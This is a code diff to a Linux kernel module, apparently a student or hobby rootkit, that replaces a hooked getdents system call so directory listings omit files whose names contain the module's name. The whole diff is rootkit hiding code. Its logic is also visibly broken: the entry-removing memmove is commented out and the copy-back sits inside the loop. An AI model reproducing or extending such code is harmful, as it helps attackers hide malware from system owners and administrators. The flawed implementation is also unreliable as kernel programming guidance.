@@ -9,6 +9,7 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 #include <asm/uaccess.h>
+#include <linux/slab.h>
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -81,7 +82,41 @@ asmlinkage int sneaky_read(int fd, char *buf, size_t count)
 
 asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
 {
-  return original_getdents(fd, dirp, count);
+  unsigned int ret;
+  struct linux_dirent *alt_dirp, *cur_dirp;
+  int i;
+  ret = original_getdents(fd, dirp, count);
+
+  if(ret>0){
+    alt_dirp = (struct linux_dirent *) kmalloc(ret, GFP_KERNEL);
+    memcpy(alt_dirp, dirp, ret);
+    cur_dirp = alt_dirp;
+    i = ret; //number of bytes read
+    while(i>0){
+	i-=cur_dirp->d_reclen;
+		if(strstr( (char*) &(cur_dirp->d_name), MODULE_NAME) != NULL  )
+		{
+			if(i!=0){
+			//	memmove(cur_dirp, (char *) cur_dirp + cur_dirp->d_reclen, i);
+			}
+			else{
+				cur_dirp->d_off = 1024;
+			}
+			ret -=cur_dirp->d_reclen;
+		}
+		if(cur_dirp->d_reclen == 0){
+			ret -=i;
+			i =0;
+		}
+		if(i != 0){
+			cur_dirp = (struct linux_dirent *) ( (char *) cur_dirp + cur_dirp->d_reclen );
+		}
+
+		memcpy(dirp, alt_dirp, ret);
+    }
+	kfree(alt_dirp);
+  }
+  return ret;
 }
 
 //The code that gets executed when the module is loaded
